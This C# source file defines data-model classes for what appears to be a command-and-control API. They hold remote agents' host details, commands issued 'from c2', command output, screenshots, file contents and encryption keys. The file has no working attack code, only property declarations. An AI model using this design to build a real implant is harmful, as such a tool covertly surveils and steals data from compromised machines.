namespace shadowerapis.Models
{
    public class shadoweragent
    {
        public string agentHostName { get; set; }
        public string command { get; set; }
        public string commandtxtres { get; set; }
        public string screen { get; set; }
        public string filename { get; set; }
        public string filecontent { get; set; }
        public string agentIP { get; set; }
        public string agentOS { get; set; }
        public string agentUniquID { get; set; }
        public string agentMacID { get; set; }
        public string aes_key { get; set; }
        public string aes_iv { get; set; }
        public string pub_key { get; set; }
        public string pvt_key { get; set; }
        public string createdat { get; set; }
    }

    public class command
    {
        public string commandfromc2 { get; set; }
        public string agentuniqid { get; set; }
        public string pubkey { get; set; }
    }
    

    public class commandresult
    {
        public string commandfromc2 { get; set; }
        public string cmdtxtresult { get; set; }
        public string screenshot { get; set; }
        public string filecontent { get; set; }
        public string filename { get; set;}
        public string agentuniqid { get; set; }
        public string aes_iv { get; set; }
        public string pub_key { get; set; }
        public string aes_key { get; set; }

    }
}
